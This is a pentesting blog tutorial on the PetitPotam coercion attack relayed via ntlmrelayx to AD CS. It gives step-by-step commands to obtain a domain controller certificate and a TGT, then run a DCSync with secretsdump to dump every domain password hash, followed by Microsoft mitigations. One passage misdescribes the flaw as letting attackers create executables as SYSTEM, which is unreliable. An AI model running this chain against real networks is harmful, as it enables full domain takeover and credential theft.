---
layout: post
title: "From Intruder to Domain Admin: PetitPotam's Journey Through NTLM Relay in Active Directory"
date: "2025-03-21"
authors: ["joao_paulo_assis"]
categories: ["Pentesting", "Red Team", "Hacking", "Active Directory"]
description:
thumbnail: "/assets/images/posts/joao-paulo/1/1-cloudflare-zero-trust.webp"
image: "define it"
comments: false

meta_title: "From Intruder to Domain Admin: PetitPotam's Journey Through NTLM Relay in Active Directory"
meta_description:
meta_image: "/assets/images/posts/joao-paulo/1/1-cloudflare-zero-trust.webp"
---

Today, we’re going to discuss a vulnerability that has been known for some time, yet continues to be a thorn in the side of many domain administrators: the notorious <strong>PetitPotam</strong>.

But what exactly is this vulnerability? It’s a flaw associated with the <strong>MS-EFSRPC</strong> protocol (Microsoft Encrypting File System Remote Protocol, which is a Remote Procedure Call interface used to manage encrypted data, enforcing access control policies and confidentiality against unauthorized access). When combined with an NTLM Relay attack, this vulnerability allows an attacker to force a Domain Controller (DC) to authenticate to a listener under the attacker’s control. The attacker can then relay these credentials to another target—most commonly to AD CS (Active Directory Certificate Services). As a result, the attacker can obtain a certificate issued by the Domain Controller, which can then be used to request a Ticket Granting Ticket (TGT), thereby compromising the domain using the Pass-The-Ticket technique.

It’s worth noting that there are several other ways to combine this attack to exploit different flaws in Active Directory processes. However, the method I’ll be focusing on today is related to AD CS. AD CS is particularly interesting because it offers services and functionalities that, <strong>by default</strong>, accept NTLM-based authentication. These services specifically include the <strong>Certificate Authority Web Enrollment</strong> and the <strong>Certificate Enrollment Web Service</strong>.

Alright, let’s get straight to the point. First of all, how can this vulnerability be identified? Thanks to the great CrackMapExec project, we have a module called PetitPotam at our disposal. This module essentially replicates the process carried out by the exploit, which involves performing an insufficient path check in the MS-EFSR protocol using the EfsRpcOpenFileRaw method. This method allows attackers to force the SYSTEM account to create an executable file of their choice, thereby granting local administrative privileges.

Então podemos utilizar-se da seguinte sintaxe de comando:

> crackmapexec smb $target-IP -u username -p password -d $DOMAIN -M PetitPotam

If the system is vulnerable, you’ll see a result similar to this:

<center>
{% include framework/shortcodes/figure.html src="/assets/images/posts/joao-paulo/2/result-vulnerable.webp" alt="Result Vulnerable" %}
</center>

As we can see, it already provides us with the information on where to find the exploit to take advantage of this vulnerability — it can be found at
<a href="https://github.com/topotam/PetitPotam/" target="_blank">https://github.com/topotam/PetitPotam/</a>

Alright, now that we have the exploit in hand, we can move on to the next step, which is configuring ntlmrelayx to capture the authentication and relay it to the AD CS server. You can find ntlmrelayx in Fortra’s repository: <a href="https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py" target="_blank">https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py</a>

The ntlmrelayx configuration syntax will look something like this:

> python3 ntlmrelayx.py -debug -t http://adcs.alvo.com.br/certsrv/certfnsh.asp -smb2support — adcs — template DomainController

In place of adcs.alvo.com.br, you’ll need to specify the URL of your domain’s AD CS. I’m guessing you’d appreciate a tip on how to find that information—no worries, I’ve got you covered! :)

There are several ways to identify or enumerate AD CS. I’ll leave a link below with a variety of commands using both certutil and ldapsearch for that purpose—make good use of it!

{% include framework/shortcodes/link-preview.html
   link="https://0xalwayslucky.gitbook.io/cybersecstack/active-directory/adcs-privesc-certificate-templates"
   title="ADCS PrivEsc: Certificate Templates"
   subtitle="Privilege escalation with Active Directory Certificate Services"
   domain="0xalwayslucky.gitbook.io"
%}

Now that we have this information, we can move on to executing our exploit with the goal of relaying the credentials to AD CS and obtaining our valuable base64-encoded PKCS#12 certificate in the name of the Domain Controller. The syntax for running the exploit would look something like this:

> python3 petitpotam.py $listener-ip $target-ip

<strong>Note: If you’re running this on a Windows machine, you may need to provide authentication to the exploit, which would look like this:</strong>

> python3 petitpotam.py -u username -p password -d domain $listener-ip $target-ip

What is <strong>$listener-ip?</strong> It refers to the IP address where the ntlmrelayx server is running. Keep in mind that this server must be able to communicate with both the Domain Controller and the AD CS. As for <strong>$target-ip</strong>, it refers to the IP address of the vulnerable Domain Controller that was identified during the CrackMapExec phase.

If the exploit runs successfully, you’ll receive something like this on your ntlmrelayx output:

<center>
{% include framework/shortcodes/figure.html src="/assets/images/posts/joao-paulo/2/logs.webp" alt="LOGS" %}
</center>

Great — we now have our base64-encoded PKCS#12 certificate issued by AD CS in the name of the Domain Controller. So, what’s the next step? We need to obtain a TGT using this certificate. In many articles, tools like Kekeo, Rubeus, and Mimikatz are commonly used to carry out this stage of the attack, but there are other ways we can leverage this as well.

To obtain the TGT, I recommend using a tool called gettgtpkinit.py, which can be found in the following repository: <a href="https://github.com/dirkjanm/PKINITtools" target="_blank">https://github.com/dirkjanm/PKINITtools</a>

The syntax will look something like this:

> python3 gettgtpkinit.py domain/username -pfx-base64 (certificate) dc.ccache

Keep in mind that the username should be the user the certificate is linked to—in the example above, that would be <strong>DC-101$</strong>. And where it says (certificate), you’ll replace it with the base64 string that was generated. Once executed, you’ll then have your TGT—in this case, saved as dc.ccache.

With the TGT in hand, there are a number of actions you can now perform within Active Directory. However, to complete our objective of becoming a Domain Admin, we can carry out a DCSync attack. In short, a DCSync attack is an exploitation technique that allows an attacker to mimic the behavior of a Domain Controller (DC) on a network and request password information from other Domain Controllers. This is done through Active Directory replication—a process normally used to synchronize account and password data between Domain Controllers. The DCSync attack can be used to obtain password hashes of specific accounts, including administrator accounts, without requiring physical or administrative access to the target system.

We can use secretsdump to carry out the DCSync attack. To do this, we first need to export our TGT to the Kerberos authentication environment variable using the following command (for Linux machines):

> export KRB5CCNAME=dc.ccache

And the syntax would look something like this:

> python3 secretsdump.py -just-dc -debug -k -no-pass domain\username -outputfile DC.secretsdump

And watch the magic happen—from that point on, you’ll have access to all the password hashes of the domain’s users, including the hashes of the Domain Admins. With that, you can either attempt to crack the passwords and potentially view them in plain text, or alternatively, leverage techniques like Pass-the-Hash to access other services and processes across the network.

And after all, how can our fellow defenders of the realm — the Blue Teamers — mitigate this vulnerability?

There are several ways to mitigate it — some of them even recommended by Microsoft itself, such as:

1. Enable EPA (Extended Protection for Authentication) for Certificate Authority Web Enrollment — <strong>this is the most secure and recommended option</strong>;

2. Enable EPA for the Certificate Enrollment Web Service — <strong>again, the most secure and recommended option</strong>;

3. Enable <strong>“Require SSL,”</strong> which enforces HTTPS-only connections.

Additionally, it’s recommended to evaluate the use of the NTLM protocol across the entire environment. If it’s not necessary, the use of the protocol should be completely removed or disabled.

For more detailed information on mitigation, I recommend checking out the link below:

{% include framework/shortcodes/link-preview.html
   link="https://support.microsoft.com/en-us/topic/kb5005413-mitigating-ntlm-relay-attacks-on-active-directory-certificate-services-ad-cs-3612b773-4043-4aa9-b23d-b87910cd3429?source=post_page-----851736c57870---------------------------------------"
   title="KB5005413: Mitigating NTLM Relay Attacks on Active Directory Certificate Services (AD CS)"
   subtitle="Microsoft is aware of PetitPotam which can potentially be used to attack Windows domain controllers or other Windows servers."
   domain="support.microsoft.com"
%}

Stay happy, and happy hacking! :)
